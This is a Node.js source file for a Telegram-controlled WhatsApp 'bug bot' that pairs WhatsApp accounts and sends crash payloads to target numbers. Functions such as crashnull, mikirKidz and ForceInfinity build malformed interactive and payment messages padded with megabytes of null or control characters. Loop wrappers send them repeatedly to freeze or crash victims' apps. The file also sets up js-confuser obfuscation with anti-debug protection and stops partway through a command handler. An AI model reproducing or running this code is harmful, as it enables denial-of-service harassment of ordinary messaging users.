const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync('./Database/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./Database/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./Database/premium.json');
ensureFileExists('./Database/admin.json');

// Fungsi untuk menyimpan data premium dan admin
function savePremiumUsers() {
    fs.writeFileSync('./Database/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./Database/admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./Database/premium.json', (data) => (premiumUsers = data));
watchFile('./Database/admin.json', (data) => (adminUsers = data));


const axios = require("axios");
const chalk = require("chalk"); // Import chalk untuk warna
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");

const BOT_TOKEN = config.BOT_TOKEN;
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/VALLOFFCIAL/dbsc31/refs/heads/main/token.json"; // Ganti dengan URL GitHub yang benar

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
  } catch (error) {
    console.error(chalk.red("âŒ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("ğŸ” Sabar jembut periksa token..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("âŒ wkwkw lu mau nyolong ya cukii."));
    process.exit(1);
  }

  console.log(chalk.green(` #- Token Validâ €â €`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

bot.on("polling_error", (err) => {
  console.error("Polling error:", err.code, err.response?.body, err.message, err.stack);
});

function startBot() {
  console.log(chalk.red(`
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â ¿â ›â ›â£‰â£‰â£¥â£¤â£¤â£¤â£¤â£¤â£¤â£¤â£ˆâ£‰â¡™â ›â ¿â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡¿â Ÿâ ‹â£¡â£¤â£¶â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¶â£¦â£„â¡‰â ›â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â Ÿâ¢‹â£ â£¶â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£·â£¤â¡ˆâ »â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â Ÿâ¢â£´â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¶â£„â ™â¢¿â£¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â Ÿâ¢â£´â£¿â£¿â£¿â£¿â ¿â£»â£¿â£¿â£¿â£¿â£¿â£¿â¡¿â Ÿâ ›â ›â¢›â£›â£›â¡›â ›â ¿â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â¡»â¢¿â£¿â£¿â£¿â£·â£„â ¹â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â¡¿â ‹â£°â£¿â¡¿â ¿â Ÿâ ‰â£ â£¾â£¿â£¿â£¿â Ÿâ£‹â£¿â¡¿â£«â£´â¡¾â£±â£¿â¢¸â£§â¢»â£¶â£â ²â£®â£â¡»â¢¿â£¿â£¿â£¿â£¦â ˆâ ™â ›â¢¿â£¿â£¦â ˆâ¢¿â£¿â£¿â£¿
â£¿â£¿â¡¿â â£¼â£¿â ‹â£°â ƒâ¢€â œâ£¿â£¿â¡¿â¢‹â£´â£Ÿâ¡»â¢‹â£¼â£¿â£¿â¢¡â£¿â£¿â£¼â£¿â£†â¢»â£¿â£·â¡Œâ¢¿â£›â£§â£â¢¿â£¿â£¿â¡â¡„â ˆâ¢§â ™â¢¿â£·â¡€â¢»â£¿â£¿
â£¿â£¿â â£¾â Ÿâ¡…â €â¡§â ’â â£¼â£¿â¢â£´â£¿â£¿â¡¿â¢£â£¾â£¾â£¿â¡…â£¿â ‹â ¡â¢Œâ ‰â¢»â£¾â£¿â£¶â£¿â£â¢»â£¿â£¿â£·â£â¢¿â£·â¡ˆâ “â¢¬â¡„â ˆâ¡™â£·â¡€â¢»â£¿
â£¿â ƒâ£¼â¡â¢¸â¡‡â ˆâ¢€â¡„â£¾â¡¿â£¡â£¿â£¿â£¿â£¿â¢£â£¿â£¿â£¿â£¿â£·â£¿â£·â£¾â ˆâ£€â£¼â£¿â£¿â£¿â£¿â£¿â¡â¢¿â£¿â£¿â£¿â£â¢»â£¿â¡€â¡€â â¢€â¡‡â ˜â£·â ˆâ£¿
â¡Ÿâ¢ â£¿â â €â¡‡â ”â ‰â£¸â£¿â¢¡â£¿â£¿â£­â£»â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡¿â¢¼â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¼â£Ÿâ£¿â£¿â£¿â¡†â¢¿â£§â ˆâ ³â£˜â¡‡â €â£¿â¡‡â¢¸
â ƒâ¢¸â â¡„â €â ‡â¢€â£´â£¿â¡‡â£¾â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¯â£„â£€â£¼â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡˜â£¿â¡‡â €â ˜â ƒâ¢€â¡¿â£¿â ˆ
â €â£¿â €â¢¿â¡€â¢ â¡â¢¸â£¿â£·â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡¿â ›â ‰â ‰â ›â ¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡‡â¢»â£‡â ¹â£„â €â£¼â ƒâ£¿â¡€
â €â£¿â¡€â ˆâ£§â¡â €â£¾â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡¿â Ÿâ ‰â¢ â£¿â †â â¢¾â¡‡â ˆâ »â ¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¢¾â£¿â¡€â ™â£¦â ƒâ €â£¿â¡‡
â €â£¿â£§â €â ¸â €â¢°â¢»â£¿â »â£¿â£¿â£¿â£¿â£¿â¡¿â â €â €â €â €â €â£¼â£¿â¡â ¸â£¿â£¿â €â €â €â €â €â ˆâ¢¹â£¿â£¿â£¿â£¿â£¿â¡‡â£¾â¡¿â£‡â €â¡â €â£¸â£¿â 
â¡„â¢¸â ˆâ¢·â¡„â €â¡¿â €â£¿â¡‡â¢¿â£¿â£¿â£¿â£¿â¡‡â €â €â €â €â €â €â¢¸â£¿â¡‡â €â£¿â¡Ÿâ €â €â €â €â €â €â ˜â£¿â£¿â£¿â£¿â£¿â¢â£¿â ƒâ¢¹â¡€â¢€â£¼â ƒâ£¿â €
â£§â ˜â£§â €â ™â¢¦â¡‡â €â ™â¢¿â¡œâ£¿â¢Ÿâ£›â£­â €â €â €â €â €â €â €â €â¢»â¡‡â €â¡¿â â €â €â €â €â €â €â €â£­â£â£›â ¿â â£¾â¢â €â¢¸â¡¥â ‹â â£°â¡‡â¢¸
â£¿â¡„â¢»â¡·â£„â €â ƒâ €â¢¸â ˆâ¢·â¡™â£¿â£¿â£¿â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢¹â£¿â£¿â¢â¡¼â ƒâ£¾â €â ˜â â¢€â¢¼â¡¿â¢€â£¿
â£¿â£·â¡€â¢¿â¡ˆâ ³â£¤â¡€â ˜â¡‡â ˆâ¢¿â£®â£¿â¡â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢¸â£¿â££â£¾â ƒâ¢ â¡‡â¢€â£ â ¶â¢‹â£¼â ƒâ£¼â£¿
â£¿â£¿â£·â¡€â¢»â£„â¡€â ‰â “â ¾â¡€â ˜â¡Œâ »â¡‡â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢¸â Ÿâ¢©â †â €â¡¼â šâ ‹â â£ â¡¾â ƒâ£¼â£¿â£¿
â£¿â£¿â£¿â£·â¡„â ¹â£¿â¡¢â£„â£€â¡€â €â ™â£†â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢ â â €â¢€â£€â£ â ´â£¾â¡Ÿâ¢â£¼â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¦â¡ˆâ¢¿â£¦â£‰â ‰â ›â ›â šâ “â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â ’â ƒâ šâ ›â ‰â¢‰â£¤â¡¾â ‹â£ â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£„â¡™â ¿â£¿â¡’â ¶â ¦â ¶â ¶â ¾â ›â â €â €â €â €â €â €â €â €â €â €â €â €â €â ™â ³â ¶â ¶â ´â ¶â¢–â£¾â¡¿â ‹â£ â£¾â£¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¦â£ˆâ ›â¢·â£¦â£¤â£„â£¤â£¤â¡„â €â €â €â €â €â €â €â €â €â €â €â €â €â£¤â£¤â£¤â£¤â£¤â¡¶â Ÿâ¢‰â£¤â£¾â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£·â£¦â£ˆâ ™â »â ¿â£¿â â €â €â €â €â €â €â €â €â €â €â €â €â €â£¿â¡¿â ¿â ›â£‰â£¤â£¾â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£·â£¶â£¤â£„â£€â¡€â €â €â €â €â €â €â €â €â €â£€â£ â£¤â£´â£¶â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
`));


console.log(chalk.red(`
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  ğŸ‡·ğŸ‡º  TOKEN KAMU VALID BANG     
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
`));

console.log(chalk.blue(`
[ ğŸš€ BOT BERJALAN... ]
`));
};

validateToken();

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`OSCAR INVICTUS
â•°â¤ Number  : ${botNumber} 
â•°â¤ Status : Loading...\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`ğ™²ğšğ™¾ğš†-ğ™¸ğ™½ğš…ğ™¸ğš‚ğ™¸ğ™±ğ™»ğ™´
â•°â¤ Number  : ${botNumber} 
â•°â¤ Status : Mennghubungkan\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`OSCAR INVICTUS
â•°â¤ Number  : ${botNumber} 
â•°â¤ Status : Gagal Tersambung\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`OSCAR INVICTUS
â•°â¤ Number  : ${botNumber} 
â•°â¤ Status : Pairing
â•°â¤Pesan : Succes Pairing\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`OSCAR INVICTUS
â•°â¤ Number  : ${botNumber} 
â•°â¤ Status : Pairing\`\`\`
â•°â¤ Kode : \`\`${formattedCode}\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
    \`\`\`OSCAR INVICTUS
â•°â¤ Number  : ${botNumber} 
â•°â¤ Status : ErorrâŒ
*â•°â¤ Pesan* : ${error.message}\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}




//-# Fungsional Function Before Parameters

//~RuntimeğŸ—‘ï¸ğŸ”§
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); // Simpan waktu mulai bot

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed BotsğŸ”§ğŸ—‘ï¸
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); // Panggil fungsi yang sudah dibuat
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

// Get Random Image
function getRandomImage() {
  const images = [
    "https://j.top4top.io/p_3529xgv5n1.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldown 
const cooldowns = new Map();
const cooldownTime = 5 * 60 * 1000; // 5 menit dalam milidetik

function checkCooldown(userId) {
  if (cooldowns.has(userId)) {
    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(userId));
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000); // Sisa waktu dalam detik
    }
  }
  cooldowns.set(userId, Date.now());
  setTimeout(() => cooldowns.delete(userId), cooldownTime);
  return 0; // Tidak dalam cooldown
}


// ~ Enc Xopwn Confugurasi
const getVincentObfuscationConfig = () => {
    const generateSiuCalcrickName = () => {
        // Identifier generator pseudo-random tanpa crypto
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `Verowå’ŒCROWSæ— CROWSræ°”${randomPart}`;
    };

    return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,       
        stringEncoding: true,           
        stringSplitting: true,      
    controlFlowFlattening: 0.95,
    shuffle: true,
        rgf: false,
        flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
        }
    };
};

// #Progres #1
const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "â–°".repeat(filled) + "â–±".repeat(total - filled);
};

// ~ Update Progress 
// Fix `updateProgress()`
async function updateProgress(bot, chatId, message, percentage, status) {
    if (!bot || !chatId || !message || !message.message_id) {
        console.error("updateProgress: Bot, chatId, atau message tidak valid");
        return;
    }

    const bar = createProgressBar(percentage);
    const levelText = percentage === 100 ? "âœ… Selesai" : `âš™ï¸ ${status}`;
    
    try {
        await bot.editMessageText(
            "```css\n" +
            "ğŸ”’ EncryptBot\n" +
            ` ${levelText} (${percentage}%)\n` +
            ` ${bar}\n` +
            "```\n" +
            "_Â© Lipzlight_",
            {
                chat_id: chatId,
                message_id: message.message_id,
                parse_mode: "Markdown"
            }
        );
        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
    } catch (error) {
        console.error("Gagal memperbarui progres:", error.message);
    }
}


// [ BUG FUNCTION ]
async function crashnull(sock, targetPtcp = true) {
  const mentionedJid = [
    "0@s.whatsapp.net",
    ...Array.from(
      { length: 1900 },
      () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
    )
  ];
  
  const randomJid = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";
  const contextParticipant = targetPtcp ? sock : randomJid;

  const nativeFlowMessages = [
    {
      name: 'call_permission_request',
      paramsJson: `\u0000`.repeat(1065000),
      icon: "promotion",
      version: 3
    },
    {
      name: 'single_select',
      paramsJson: `\u0000`.repeat(1065000),
      icon: "promotion",
      version: 3
    },
    {
      name: 'form_message',
      paramsJson: `\u0000`.repeat(1065000),
      icon: "promotion",
      version: 3
    },
    {
      name: 'address_message',
      paramsJson: `\u0000`.repeat(1065000),
      icon: "promotion",
      version: 3
    }
  ];

  await sock.relayMessage(sock, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "",
            hasMediaAttachment: false
          },
          body: {
            text: "âŒâƒ°ğ“ğâ€Œğğâ€Œğ± ğ—â€ŒğŸ”à¼‘"
          },
          nativeFlowResponseMessage: nativeFlowMessages[0],
          nativeFlowMessages: nativeFlowMessages,
          contextInfo: {
            participant: contextParticipant,
            mentionedJid: mentionedJid,
            remoteJid: "X",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: randomJid,
                creatorName: "Bot"
              }
            }
          },
          carouselMessage: {
            messageVersion: 1,
            cards: cardss
          }
        },
        interactiveResponseMessage: {
          body: {
            text: "MY LIFE STYLE",
            format: "DEFAULT"
          },
          externalAdReply: {
            showAdAttribution: true,
            title: "ğŸ©¸âƒŸà¼‘âŒâƒ°ğ™ğâ€Œğ«ğ¨ ğ„ğ±â€Œâ€Œğğœğ®â€Œğ­ğ¢ğ¨ğ§ ğ•â€Œğšâ€Œğ®ğ¥ğ­à½€â€Œâ€ŒğŸ¦ ï¸",
            body: "",
            thumbnailUrl: null,
            sourceUrl: "HTTP://WA.ME/STICKERPACK/settings/call",
            mediaType: 1,
            renderLargerThumbnail: true
          },
          businessMessageForwardInfo: {
            businessOwnerJid: sock
          },
          dataSharingContext: {
            showMmDisclosure: true
          },
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 2,
              expiryTimestamp: null
            }
          }
        }
      }
    }
  }, { 
    participant: { jid: sock },
    quoted: null,
    useraJid: null,
    messageId: null
  });
}

async function mikirKidz(target) {
  try {
    let message = {
      interactiveMessage: {
        body: { text: "X" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    for (let iterator = 0; iterator < 1; iterator++) {
      const msg = generateWAMessageFromContent(target, message, {});

      await sock.relayMessage(target, msg.message, {
        additionalNodes: [
          { tag: "biz", attrs: { native_flow_name: "payment_method" } },
        ],
        messageId: msg.key.id,
        participant: { jid: target },
        userJid: target,
      });

      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { native_flow_name: "payment_method" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });

      await new Promise((resolve) => setTimeout(resolve, 500));
    }

    console.log("BUG TERKIRIM");
  } catch (err) {
    console.error(calik.red.bold(err));
  }
}

async function ForceInfinity(target) {
  try {
    let message = {
      interactiveMessage: {
        body: { text: "ğ™“ğ™”ğ™ğ™Šğ™ ğ™ˆğ™Šğ™Šğ™‰" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    const msg = generateWAMessageFromContent(target, message, {});

    await sock.relayMessage(target, msg.message, {
      additionalNodes: [
        { tag: "biz", attrs: { native_flow_name: "payment_method" } },
      ],
      messageId: msg.key.id,
      participant: { jid: target },
      userJid: target,
    });

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { native_flow_name: "payment_method" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    console.log("ğ™ğ™¤ğ™§ğ™˜ğ™š ğ™ƒğ™–ğ™§ğ™™ ğ™“ğ™®ğ™§ğ™¤ğ™¨ ğ™¨ğ™ªğ™˜ğ™˜ğ™šğ™¨ ğ™©ğ™¤ ğ™©ğ™–ğ™§ğ™œğ™šğ™©");
  } catch (err) {
    console.error(calik.red.bold(err));
  }
}
// [ END FUNCTION ]
async function Delayy(target) {
 for (let i = 0; i < 10; i++) {
 await BetaDelay(target);
 await sleep(350);
 await DelayFarras(target);
 await sleep(350);
 await XStromDelayVisible(target);
 await sleep(350);
 await LocationDelayCore(target);
 await sleep(350);
console.log(chalk.blueBright(`OSCAR Delay Sending Bug ğŸ¦  `));
  }
  }

async function Uikontol(target) {
 for (let i = 0; i < 25; i++) {
 await XProtexCallV7Galxy(target);
 await sleep(1000);
 await curseqcrash(target);
 await sleep(1000);
 await SpcmUi(target);
 await sleep(1000);
console.log(chalk.blueBright(`OSCAR ui Sending Bug ğŸ¦  `));
  }
  }
  
async function blankmemek(target) {
 for (let i = 0; i < 20; i++) {
 await SectionsCrash(target);
 await sleep(1000);
 await XProtexBlankChatV3(target);
 await sleep(1000);
 await ComboBlank(target)
 await sleep(1000);
 console.log(chalk.blueBright(`OSCAR blank Sending Bug ğŸ¦  `));
  }
  }  

async function Feeeze(target) {
 for (let i = 0; i < 25; i++) {
 await mikirKidz(target);
 await sleep(1000);
 await ForceInfinity(target);
 await sleep(1000);
 await uiKiller(target);
 await sleep(1000);
 console.log(chalk.blueBright(`OSCAR Feeeze Sending Bug ğŸ¦  `));
  }
  }
       
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
/////---------------[sleep function]------_-_
const bugRequests = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const randomImage = getRandomImage();
  

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>Ğ˜Ğ·Ğ²Ğ¸Ğ½Ğ¸, Ğ´Ğ¾Ñ€Ğ¾Ğ³Ğ°Ñ, Ñƒ Ñ‚ĞµĞ±Ñ Ğ½ĞµÑ‚ Ğ²Ğ¾Ğ·Ğ¼Ğ¾Ğ¶Ğ½Ğ¾ÑÑ‚Ğ¸ ÑĞ²ÑĞ·Ğ°Ñ‚ÑŒÑÑ Ñ Ğ½Ğ¸Ğ¼, Ğ¿Ğ¾Ñ‚Ğ¾Ğ¼Ñƒ Ñ‡Ñ‚Ğ¾ Ñƒ Ğ½ĞµĞ³Ğ¾ ĞµÑÑ‚ÑŒ ĞºÑ‚Ğ¾-Ñ‚Ğ¾ Ğ´Ñ€ÑƒĞ³Ğ¾Ğ¹ ( ğŸ«€ ).</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner", url: "https://t.me/Vwyro1" }],
      ]
